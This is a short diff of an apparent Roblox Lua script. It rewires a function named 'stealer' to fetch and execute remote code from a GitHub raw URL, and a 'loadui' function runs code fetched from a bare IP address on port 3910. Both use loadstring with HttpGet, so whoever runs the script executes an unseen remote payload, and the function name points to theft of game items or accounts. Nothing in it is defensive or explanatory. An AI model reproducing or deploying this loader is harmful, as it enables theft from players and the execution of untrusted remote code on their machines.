@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/'))() -- loadstring(game:HttpGet("https://raw.githubusercontent.com/onyxadm7/AdoptMe/refs/heads/main/ADM"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/onyxadm7/AdoptMe/refs/heads/main/ADM"))()
 end
 local function loadui()
   loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
